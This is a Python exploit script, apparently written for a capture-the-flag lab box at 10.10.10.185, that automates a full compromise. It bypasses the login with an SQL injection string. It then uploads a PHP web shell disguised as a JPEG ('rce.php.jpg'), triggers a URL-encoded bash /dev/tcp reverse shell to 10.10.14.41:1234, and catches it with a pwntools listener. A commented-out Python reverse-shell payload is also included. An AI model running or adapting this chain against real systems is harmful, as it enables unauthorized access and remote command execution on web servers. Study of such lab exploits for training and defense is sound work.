#!/usr/bin/python3

import requests
import threading
import signal
import time
import sys

from pwn import log, context, listen


def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)


# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Proxies for troubleshooting
proxies = {
    "http": "http://127.0.0.1:8080",
}

s = requests.Session()
s.proxies.update(proxies)


def foothold():
    """
    POST SQL Injection on login.php
    """
    login_url = "http://10.10.10.185/login.php"
    login_parameters = {"username": "' or 1=1-- -", "password": ""}
    s.post(login_url, data=login_parameters, allow_redirects=True)
    # print(post_sqli.text)
    print("[+] Logged in!")

    """
    Upload jpeg with rce code
    """
    upload_url = "http://10.10.10.185/upload.php"

    """
    Content-Disposition: form-data; name="image"; filename="rce.php.jpg"
    Content-Type: image/jpeg
    Content-Disposition: form-data; name="submit"
    Upload Image
    """
    # Download a valid JPEG image and execute this command in your terminal:
    # echo '<?php echo "<pre>" . shell_exec($_REQUEST["cmd"]) . "</pre>"; ?>' >> rce.jpg
    upload_image = {
        "image": ("rce.php.jpg", open("rce.jpg", "rb"), "image/jpeg"),
        "submit": (None, "Upload Image"),
    }

    s.post(
        upload_url,
        files=upload_image,
    )

    print("[+] Uploaded the file")

    # Reverse Shell (Change the IP and PORT of the payload)
    rce_url = "http://10.10.10.185/images/uploads/rce.php.jpg"
    payload = "?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.41%2F1234%200%3E%261%27"
    # payload = "?cmd=python3%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.41%22%2C1234%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27%0A"
    requests.get(rce_url + payload)


if __name__ == "__main__":
    try:
        threading.Thread(target=foothold, args=()).start()
    except Exception as e:
        log.error(str(e))

    # context.log_level = "debug"

    listen_port = 1234

    shell = listen(listen_port, timeout=5).wait_for_connection()

    # Check if the socket has been established
    if shell.sock is None:
        log.failure("We couldn't connect to the system")
        sys.exit()
    else:
        log.success("We have access to the system as the user www-data")
        time.sleep(1)

    shell.interactive()
